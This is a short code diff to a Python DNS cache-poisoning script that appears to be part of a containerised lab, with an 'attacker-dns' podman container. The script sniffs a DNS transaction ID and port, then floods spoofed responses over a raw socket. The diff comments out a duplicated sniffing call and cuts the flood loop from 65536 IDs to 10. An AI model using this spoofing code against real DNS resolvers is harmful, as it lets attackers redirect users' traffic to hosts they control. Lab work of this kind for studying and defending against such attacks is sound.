@@ -57,7 +57,7 @@ def sniff_port_and_txid(max_attempts=5):
     print("[-] Example: podman exec -it attacker-dns python3 /attacks/Cache_poisoning.py")
     exit(1)
 
-leaked_txid, target_port = sniff_port_and_txid()
+#leaked_txid, target_port = sniff_port_and_txid()
 leaked_txid, target_port = sniff_port_and_txid()
 
 print("[*] 3. Sending request to resolve www.example.com...")
@@ -76,7 +76,7 @@ raw_bytes = bytearray(raw(base_pkt))
 s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 
 # Flood all possible TXIDs since it might be fully randomized or incrementing slightly
-for txid in range(0, 65536):
+for txid in range(0, 10):
     struct.pack_into('!H', raw_bytes, 28, (leaked_txid + txid) & 0xFFFF)
     s.sendto(raw_bytes, (target_dns, 0))
 
